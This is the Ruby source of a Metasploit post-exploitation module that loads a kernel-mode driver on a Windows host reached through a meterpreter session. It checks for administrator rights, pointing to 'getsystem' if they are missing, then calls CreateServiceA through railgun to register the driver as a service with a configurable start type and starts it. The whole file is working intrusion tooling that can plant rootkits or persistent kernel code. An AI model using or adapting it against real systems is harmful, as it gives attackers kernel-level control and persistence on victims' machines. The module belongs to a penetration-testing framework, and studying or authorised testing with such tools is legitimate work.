##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Driver Loader',
      'Description'   => %q{
        This module loads a KMD using the Windows Service API.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'Borja Merino <bmerinofe[at]gmail.com>',
      'Platform'      => 'windows',
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('DRIVER_PATH', [true, 'Relative driver path to %SYSTEMROOT%. For example, system32\drivers\msf.sys']),
        OptString.new('DRIVER_NAME', [true, 'Driver Name.']),
        OptEnum.new('START_TYPE',    [true, 'Start type.', 'auto', [ 'boot', 'system', 'auto', 'demand','disabled']]),
        OptEnum.new('SERVICE_TYPE',  [true, 'Service type.', 'kernel', [ 'kernel', 'file_system', 'adapter', 'recognizer']]),
        OptEnum.new('ERROR_TYPE',    [true, 'Error type.', 'ignore', [ 'ignore', 'normal', 'severe', 'critical']])
      ], self.class)
  end

  def run
    driver = datastore['DRIVER_PATH']
    start = datastore['START_TYPE']
    error = datastore['ERROR_TYPE']
    service = datastore['SERVICE_TYPE']
    name = datastore['DRIVER_NAME']

    unless is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    full_path = expand_path("%SYSTEMROOT%") << "\\" << driver

    unless file_exist?(full_path)
      print_error("Driver #{full_path} does not exist.")
      return
    end

    inst = install_driver(driver,start,name,error,service)
    if inst
      ss = service_start(name)
      case ss
      when 0;
        print_good("Driver loaded successfully.")
      when 1056;
        print_error("Serive already started.")
      when 1058;
        print_error("Service disabled.")
      else
        print_error("There was an error starting the service.")
      end
    end
  end

  def install_driver(driver,start,name,error,service)
    service_all_access = 0xF01FF
    error_service_exists = 0x431
    service_type = get_service_const(service)
    service_error_type = get_error_const(error)
    service_start_type = get_start_const(start)
    advapi32 = client.railgun.advapi32

    # Default access: sc_manager_all_access (0xF003F)
    ro = open_sc_manager()
    rc = advapi32.CreateServiceA(ro, name, name, service_all_access, service_type, service_start_type, service_error_type, driver, nil, nil, nil, nil, nil)
    close_sc_manager(ro)

    if rc['GetLastError'] == 0
      print_status("Service object added to the Service Control Manager database.")
      close_sc_manager(rc['return'])
      return true
    elsif rc['GetLastError'] == error_service_exists
      print_error("The specified service already exists.")
      # Show ImagePath just to know if the service corresponds to the desired driver.
      service = service_info(name)
      print_error("Path of driver file in \"#{name}\" service: #{service["Command"]}.")
    else
      print_error("There was an error opening the driver handler. GetLastError=#{rc['GetLastError']}.")
    end
    return false
  end

  def get_start_const(type)
    const_type = {
      "demand"    => 0x00000003,
      "boot"      => 0x00000000,
      "auto"      => 0x00000002,
      "disabled"  => 0x00000004,
      "system"    => 0x00000001
    }

    return const_type[type]
  end

  def get_error_const(type)
    const_type = {
      "critical"  => 0x00000003,
      "normal"    => 0x00000001,
      "severe"    => 0x00000002,
      "ignore"    => 0x00000000
    }

    return const_type[type]
  end

  def get_service_const(type)
    const_type = {
      "kernel"      => 0x00000001,
      "file_system" => 0x00000002,
      "adapter"     => 0x00000004,
      "recognizer"  => 0x00000008
    }

    return const_type[type]
  end
end
